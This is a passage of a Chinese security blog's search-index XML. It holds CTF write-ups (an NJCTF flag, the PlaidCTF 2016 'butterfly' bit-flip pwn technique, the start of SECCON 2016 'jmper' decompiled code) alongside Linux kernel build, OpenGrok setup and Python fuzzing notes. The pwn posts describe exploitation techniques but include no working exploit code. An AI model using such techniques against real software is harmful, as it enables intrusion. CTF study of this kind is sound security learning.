class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NJCTF&#123;have05-f4n&#125;</span><br><span class="line">NJCTF&#123;have05if4n&#125; &#x2F;&#x2F;这个就是flag</span><br><span class="line">Done</span><br><span class="line">48533584</span><br><span class="line">48539584</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel 编译踩坑</title>
    <url>/2019/10/24/Linux-Kernel-%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/</url>
    <content><![CDATA[<h2 id="env-config"><a href="#env-config" class="headerlink" title="env config"></a>env config</h2><p><code>ubuntu 18.04 amd64</code></p>
<a id="more"></a>

<h3 id="gcc-8"><a href="#gcc-8" class="headerlink" title="gcc-8"></a>gcc-8</h3><p>works on ubuntu 16.04 and 18.04</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r/<span class="built_in">test</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gcc-8 g++-8</span><br><span class="line">gcc-8 --version</span><br></pre></td></tr></table></figure>

<h3 id="clang"><a href="#clang" class="headerlink" title="clang"></a>clang</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">R=348261</span><br><span class="line">svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/llvm/trunk llvm</span><br><span class="line"><span class="built_in">cd</span> llvm</span><br><span class="line">(<span class="built_in">cd</span> tools &amp;&amp; svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/cfe/trunk clang)</span><br><span class="line">(<span class="built_in">cd</span> projects &amp;&amp; svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt)</span><br><span class="line">mkdir llvm_cmake_build &amp;&amp; <span class="built_in">cd</span> llvm_cmake_build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON ../</span><br><span class="line">make -j64 clang</span><br><span class="line"><span class="built_in">export</span> KMSAN_CLANG_PATH=`<span class="built_in">pwd</span>`/bin/clang</span><br></pre></td></tr></table></figure>

<p>文档里<code>-j64</code>真的奢华…</p>
<h3 id="qemu-kvm"><a href="#qemu-kvm" class="headerlink" title="qemu kvm"></a>qemu kvm</h3><p>这部分推荐手动编译最新版本/较新版本，直接apt安装的版本有点老，后面可能有影响。</p>
<p>基本没啥坑，就是耗时耗力 :(</p>
<h2 id="build-kernel"><a href="#build-kernel" class="headerlink" title="build kernel"></a>build kernel</h2><h3 id="mainline"><a href="#mainline" class="headerlink" title="mainline"></a>mainline</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">cp path/to/config .config</span><br><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure>

<h3 id="linux-next"><a href="#linux-next" class="headerlink" title="linux-next"></a>linux-next</h3><p>一样的编译过程，next只是代码比较激进的版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">cp path/to/config .config</span><br><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure>

<h3 id="kmsan"><a href="#kmsan" class="headerlink" title="kmsan"></a>kmsan</h3><p>跟着readme走就行了</p>
<p>遇到一个坑点，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KMSAN_CLANG_PATH=`<span class="built_in">pwd</span>`/bin/clang</span><br><span class="line">...</span><br><span class="line">make CC=<span class="variable">$KMSAN_CLANG_PATH</span> -j64 -k 2&gt;&amp;1 | tee build.log</span><br></pre></td></tr></table></figure>
<p>直接这么编译有问题，试了几次都不行，提示说编译器不支持xxxx这类问题。<br>最后我尝试了:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=/path/to/clang</span><br></pre></td></tr></table></figure>

<p>之后直接编译就没问题了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure>

<p>这个版本我后面弄了个更新版本的clang也可以直接编译过。</p>
<h3 id="ktsan"><a href="#ktsan" class="headerlink" title="ktsan"></a>ktsan</h3><p>编译没啥坑，就是注意<code>.config</code>文件别乱改。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/ktsan.git</span><br><span class="line"><span class="built_in">cd</span> ktsan/</span><br><span class="line">make defconfig</span><br><span class="line">make kvmconfig</span><br><span class="line">scripts/config -e KTSAN -e SLAB -d SLUB -e DEBUG_INFO</span><br><span class="line">yes <span class="string">&#x27;&#x27;</span> | make oldconfig</span><br><span class="line">make -j2 LOCALVERSION=-tsan</span><br></pre></td></tr></table></figure>


<h2 id="run-kernel"><a href="#run-kernel" class="headerlink" title="run kernel"></a>run kernel</h2><p>创建文件系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IMG=qemu-image.img</span><br><span class="line">DIR=mount-point.dir</span><br><span class="line">qemu-img create <span class="variable">$IMG</span> 10g</span><br><span class="line">mkfs.ext2 <span class="variable">$IMG</span></span><br><span class="line">mkdir <span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$IMG</span> <span class="variable">$DIR</span></span><br><span class="line">sudo debootstrap --arch amd64 jessie <span class="variable">$DIR</span></span><br><span class="line">sudo umount <span class="variable">$DIR</span></span><br><span class="line">rmdir <span class="variable">$DIR</span></span><br></pre></td></tr></table></figure>

<p>这样直接创建不行，需要在取消挂载之前设置好新文件系统里的用户名密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chroot mount-point.dir /bin/bash</span><br></pre></td></tr></table></figure>

<p>进去之后，直接修改root密码就行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># passwd root</span></span><br></pre></td></tr></table></figure>
<p>其实还能做其他的设置，但是只是为了验证加载的内核是否正常，只需要登录进去就ok了。</p>
<p>基本上都能用这个命令起来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-x86_64 \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-m 2G -smp 2 \</span><br><span class="line">-hda qemu-image.img  \</span><br><span class="line">-kernel linux-5.4-rc4/arch/x86/boot/bzImage \</span><br><span class="line">-append <span class="string">&quot;debug root=/dev/sda  console=ttyS0&quot;</span> \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure>

<p>除了ktsan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -drive file=qemu-image.img,index=0 \</span><br><span class="line">  -m 24G -smp 4 \</span><br><span class="line">  -net user,hostfwd=tcp::10022-:22 -net nic \</span><br><span class="line">  -nographic \</span><br><span class="line">  -kernel arch/x86/boot/bzImage -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw debug earlyprintk=serial slub_debug=QUZ&quot;</span>\</span><br><span class="line">  -enable-kvm -cpu host</span><br></pre></td></tr></table></figure>
<p>我用它wiki里的命令无法成功启动，各种panic，或者就是文件系统挂载出问题，我换了我原本的ext2的img之后多试几次，就能正常工作了。</p>
<p>我这里给的是<code>24G</code>内存。</p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/google/ktsan/wiki">ktsan</a><br><a href="https://github.com/google/kmsan">kmsan</a><br><a href="https://www.kernel.org/">linux-kernel</a></p>
]]></content>
      <categories>
        <category>环境配置踩坑</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenGrok搭建</title>
    <url>/2017/07/05/OpenGrok%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00: 起因"></a>0x00: 起因</h4><p>工作环境换到了mac之后很多东西都不一样了。最近在看Linux kernel几个漏洞，需要阅读Linux源码，然而在windows上使用习惯了source insight后，macOS上一脸懵逼，不知道啥工具好使。了解到OpenGrok之后，决定搭建一个，主要是添加源码方便，也方便实用，感觉还不错。</p>
<p>其实vim或者subl这类编辑器看源码也可以，只是我还没习惯。所以就先OpenGrok啦～</p>
<a id="more"></a>

<h4 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01: 准备工作"></a>0x01: 准备工作</h4><p>根据github上项目的wiki可知，需要的准备工作如下：</p>
<ul>
<li>   JDK 1.8 or higher</li>
<li>   {OpenGrok binaries from <a href="https://github.com/OpenGrok/OpenGrok/releases">https://github.com/OpenGrok/OpenGrok/releases</a> (either the package for Solaris, or .tar.gz with binaries, NOT the src !)</li>
<li>   Exuberant Ctags for analysis (<a href="https://github.com/universal-ctags">https://github.com/universal-ctags</a> is recommended)</li>
<li>   A servlet container like GlassFish or Tomcat (8.x or later) also running with java at least 1.8</li>
<li>   If history is needed, appropriate binary (in some cases also cvs/svn repository) must be present on the system (e.g. Subversion or Mercurial or SCCS or … )</li>
<li>   2GB of memory for indexing process using OpenGrok script (can use less, this is scaled for bigger deployments)</li>
<li>   a recent browser for clients - IE, Firefox, recent Chrome or Safari<br>sufficient ULIMIT settings (refer to README)</li>
</ul>
<p>我在自己服务器上搭建的，系统是ubuntu，在安装了jdk8之后，去下载了tomcat和opengrok的包。<br>这里说个题外话，使用apt-get方式安装的tomcat8很奇怪，服务起来了，但是curl访问本地8080的时候，没回应，所以我最后去官网下载了一个tomcat的包。</p>
<h4 id="0x02：过程"><a href="#0x02：过程" class="headerlink" title="0x02：过程"></a>0x02：过程</h4><pre><code>如果是很多人用，推荐专门创建一个用户，做好权限的隔离，个人使用的话无所谓了。</code></pre>
<h6 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h6><ul>
<li>   找一个目录，把下载来的tomcat和opengrok解压了。</li>
<li>   启动tomcat，然后访问<code>http://127.0.0.1:8080</code>，确定tomcat正常工作。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-64-163-ubuntu:~$ ./apache-tomcat-8.5.16/bin/startup.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>   为项目创建目录，拿我自己的举例子：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">path/to/your/opengrok_projects/prj1</span><br></pre></td></tr></table></figure>

<p>目录结构如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">path&#x2F;to&#x2F;your&#x2F;opengrok_projects&#x2F;prj1</span><br><span class="line">                        |-----&#x2F;prj2</span><br><span class="line">                        |-----&#x2F;prj3</span><br></pre></td></tr></table></figure>

<h6 id="部署opengrok"><a href="#部署opengrok" class="headerlink" title="部署opengrok"></a>部署opengrok</h6><ul>
<li>   部署</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OPENGROK_TOMCAT_BASE=path/to/apache-tomcat path/to/opengrok/bin/OpenGrok deploy</span><br></pre></td></tr></table></figure>

<ul>
<li>   创建索引</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OPENGROK_VERBOSE=<span class="literal">true</span> OPENGROK_INSTANCE_BASE=./opengrok_data ./opengrok-1.1-rc5/bin/OpenGrok  index ./opengrok_projects</span><br></pre></td></tr></table></figure>

<p>创建索引时，会创建三个目录，一个data目录来存放索引信息，一个etc目录创建配置信息和一个log目录。</p>
<ul>
<li>   修改配置文件</li>
</ul>
<p>在<code>path/to/apache-tomcat/webapps/source/WEB-INF</code>目录下的<code>web.xml</code>文件</p>
<p>把</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>CONFIGURATION<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/var/opengrok/etc/configuration.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Full path to the configuration file where OpenGrok can read it&#x27;s configuration<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>中的<code>/var/opengrok/etc/configuration.xml</code><br>修改成对应的opengrok的<code>path/to/opengrok/data/etc/configuration.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Full path to the configuration file where OpenGrok can read its configuration<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>CONFIGURATION<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/home/ubuntu/opengrok_data/etc/configuration.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我这里是这个样子的。</p>
<ul>
<li>   把源码放进project目录</li>
</ul>
<p>我这里放的是linux-3.18.1的源码。以后如果想更新的话，直接放进去，然后重新生成索引就好了。</p>
<h4 id="0x03-效果"><a href="#0x03-效果" class="headerlink" title="0x03:效果"></a>0x03:效果</h4><p><img src="http://blogimg-10065924.cossh.myqcloud.com/opengrok_build/QQ20170705-123540%402x.png"></p>
<h4 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04:参考"></a>0x04:参考</h4><p><a href="https://github.com/OpenGrok/OpenGrok/wiki/How-to-install-OpenGrok">wiki</a></p>
<p><a href="https://github.com/crazygit/temp/blob/master/setup_opengrok.md">OpenGrok安装使用指南</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>PlaidCTF 2016 butterfly</title>
    <url>/2016/11/25/PlaidCTF-2016-butterfly/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>这个题目是之前和0x9A82学弟一起看的，第一次遇到这种bit位翻转的题目，在讨论了十多分钟之后才搞明白一个国际友人的解法，当时觉得他这个解法太巧妙了~遂做个记录。</p>
<a id="more"></a>
<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><p>程序大概的逻辑如下，直接放IDA F5之后的代码好了，部分变量为了阅读方便重命名了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// er14@1</span></span><br><span class="line">  __int64 addr; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">char</span> bit; <span class="comment">// bl@2</span></span><br><span class="line">  _BYTE *addr2; <span class="comment">// rbp@2</span></span><br><span class="line">  <span class="keyword">void</span> *base_addr; <span class="comment">// r15@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@5</span></span><br><span class="line">  <span class="keyword">char</span> buffer; <span class="comment">// [sp+0h] [bp-68h]@1</span></span><br><span class="line">  __int64 v11; <span class="comment">// [sp+40h] [bp-28h]@1</span></span><br><span class="line"></span><br><span class="line">  v11 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?&quot;</span>);</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( fgets(&amp;buffer, <span class="number">50</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    addr = strtol(&amp;buffer, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">    bit = addr;</span><br><span class="line">    addr2 = (_BYTE *)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    base_addr = (<span class="keyword">void</span> *)((addr &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( mprotect(base_addr, <span class="number">0x1000</span>uLL, <span class="number">7</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;mprotect1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">      *addr2 ^= <span class="number">1</span> &lt;&lt; (bit &amp; <span class="number">7</span>);                 <span class="comment">// 0000 0111</span></span><br><span class="line">      <span class="keyword">if</span> ( mprotect(base_addr, <span class="number">0x1000</span>uLL, <span class="number">5</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        perror(<span class="string">&quot;mprotect2&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;WAS IT WORTH IT???&quot;</span>);</span><br><span class="line">        v3 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( *MK_FP(__FS__, <span class="number">40L</span>L) == v11 )</span><br><span class="line">    LODWORD(v8) = v3;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序逻辑很简单，大概做了这几件事：</p>
<ol>
<li>   读取用户输入，使用<code>strtol()</code>把输入转成long类型的值。</li>
<li>   把这个值右移3 bits，我标记成了addr_base。</li>
<li>   调用<code>mprotect()</code>，修改base_addr指向的内存属性。</li>
<li>   addr2最低3 bits反转。</li>
<li>   再次调用<code>mprotect()</code>，修改base_addr指向的内存属性。</li>
</ol>
<h4 id="0x02-Thinking"><a href="#0x02-Thinking" class="headerlink" title="0x02:Thinking"></a>0x02:Thinking</h4><p>开始我的想法是写sc进去然后修改程序流程，跳进去执行。但是并没有搞定，在看了一份wp之后豁然开朗。<br>这里是main执行结束后返回的汇编代码，老外那份wp里的做法就是，使用bit翻转，把<code>add rsp,48h</code>编程<code>add rbp,48h</code>，这样的话，相当于我们可以控制返回地址。<br>有了上面的基础之后，第一次修改指令，后面构造循环1字节1字节的把shellcode写到合适的位置，然后在最后一次直接retn到那个位置，执行代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400860                 add     rsp, 48h</span><br><span class="line">.text:0000000000400864                 pop     rbx</span><br><span class="line">.text:0000000000400865                 pop     r14</span><br><span class="line">.text:0000000000400867                 pop     r15</span><br><span class="line">.text:0000000000400869                 pop     rbp</span><br><span class="line">.text:000000000040086A                 retn</span><br></pre></td></tr></table></figure>

<h4 id="0x03-Exploit"><a href="#0x03-Exploit" class="headerlink" title="0x03:Exploit"></a>0x03:Exploit</h4><h4 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04:Reference"></a>0x04:Reference</h4><ul>
<li>   <a href="http://r0p.club/2016/butterfly/">butterfly-wp-by-r0p</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Python指定概率获取随机元素</title>
    <url>/2017/12/30/Python%E6%8C%87%E5%AE%9A%E6%A6%82%E7%8E%87%E8%8E%B7%E5%8F%96%E9%9A%8F%E6%9C%BA%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>最近写fuzzer遇到了这样的一个需求，生成样本的时候，有些元素需要尽可能的多出现，而有些需要少一点，这就涉及到概率的问题了。然而直接使用random是不行的，暴力的在lib_list上做文章也不行，反而效率更低。看到了python cookbook的两个例子。</p>
<a id="more"></a>

<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><h5 id="第一种，给定概率"><a href="#第一种，给定概率" class="headerlink" title="第一种，给定概率"></a>第一种，给定概率</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_pick</span>(<span class="params">some_list,probabilities</span>):</span></span><br><span class="line">    x = random.uniform(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    cumulative_probability=<span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> item,item_probability <span class="keyword">in</span> <span class="built_in">zip</span>(some_list,probabilities):</span><br><span class="line">        cumulative_probability+=item_probability</span><br><span class="line">        <span class="keyword">if</span> x &lt; cumulative_probability:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
<p>两个参数，第一个是参数列表，第二个是概率的列表，概率列表里元素相加和必须等于1<br>比如这么调用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random_pick([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">0.1</span>,<span class="number">0.2</span>,<span class="number">0.3</span>,<span class="number">0.4</span>])</span><br></pre></td></tr></table></figure>

<p>写代码大概测了下，在大量(&gt;10w)的测试下，比较稳定，按照指定概率产生元素，比如x等于0.1就返回1。<br>但是不太适合较多参数的情况，需要一个一个指定概率啥的，还要计算好概率和为1…蛋疼。</p>
<h5 id="第二种，给权重"><a href="#第二种，给权重" class="headerlink" title="第二种，给权重"></a>第二种，给权重</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_picks</span>(<span class="params">sequence,relative_odds</span>):</span></span><br><span class="line">　　table=[z <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(sequence,relative_odds) <span class="keyword">for</span> z <span class="keyword">in</span> [x]*y]</span><br><span class="line">　　<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">　　　　<span class="keyword">yield</span> random.choice(table)</span><br><span class="line"></span><br><span class="line">x=random_picks(<span class="string">&#x27;ciao&#x27;</span>,[<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>])</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(itertools.islice(x,<span class="number">8</span>))</span><br></pre></td></tr></table></figure>

<p>第二种根据权重来返回，只要求权重是非负整数，比较容易使用，虽然还是要一个一个给权重，但是总比还要去计算个概率和，好很多。</p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>SECCON-2016 jmper</title>
    <url>/2017/03/06/SECCON-2016-jmper/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>ZCTF2017 的class的原型应该就是这个题目，在复现的时候，就从这个题目开始做起。</p>
<a id="more"></a>

<h4 id="0x01：vuln"><a href="#0x01：vuln" class="headerlink" title="0x01：vuln"></a>0x01：vuln</h4><p>关键逻辑的代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">handle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [sp+3h] [bp-1Dh]@13</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [sp+3h] [bp-1Dh]@23</span></span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [sp+4h] [bp-1Ch]@8</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+8h] [bp-18h]@2</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-14h]@12</span></span><br><span class="line">  __int64 student_name; <span class="comment">// [sp+10h] [bp-10h]@12</span></span><br><span class="line">  student *student; <span class="comment">// [sp+18h] [bp-8h]@6</span></span><br><span class="line"></span><br><span class="line">  student_num = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )                                   <span class="comment">// show student name</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;1. Add student.\n2. Name student.\n3. Write memo\n4. Show Name\n5. Show memo.\n6. Bye :)&quot;</span>);</span><br><span class="line">            __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ( student_num &gt; <span class="number">29</span> )             <span class="comment">// check num</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">puts</span>(<span class="string">&quot;Exception has occurred. Jump!&quot;</span>);</span><br><span class="line">              longjmp(jmpbuf, <span class="number">0x1BF52</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            student = (student *)<span class="built_in">malloc</span>(<span class="number">48u</span>LL); <span class="comment">// add student</span></span><br><span class="line">            student-&gt;id = student_num;</span><br><span class="line">            student-&gt;name = <span class="built_in">malloc</span>(<span class="number">32u</span>LL);</span><br><span class="line">            *(_QWORD *)(my_class + <span class="number">8L</span>L * student_num++) = student;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;ID:&quot;</span>);                  <span class="comment">// name student</span></span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">          getchar();</span><br><span class="line">          <span class="keyword">if</span> ( index &gt;= student_num || index &lt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Invalid ID.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Input name:&quot;</span>);</span><br><span class="line">          student_name = *(_QWORD *)(*(_QWORD *)(my_class + <span class="number">8L</span>L * index) + <span class="number">40L</span>L);<span class="comment">// get ptr</span></span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">          &#123;</span><br><span class="line">            v0 = getchar();</span><br><span class="line">            <span class="keyword">if</span> ( v0 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            *(_BYTE *)student_name++ = v0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;ID:&quot;</span>);                    <span class="comment">// write memo</span></span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( index &gt;= student_num || index &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid ID.&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Input memo:&quot;</span>);</span><br><span class="line">        student_name = *(_QWORD *)(my_class + <span class="number">8L</span>L * index) + <span class="number">8L</span>L;</span><br><span class="line">        <span 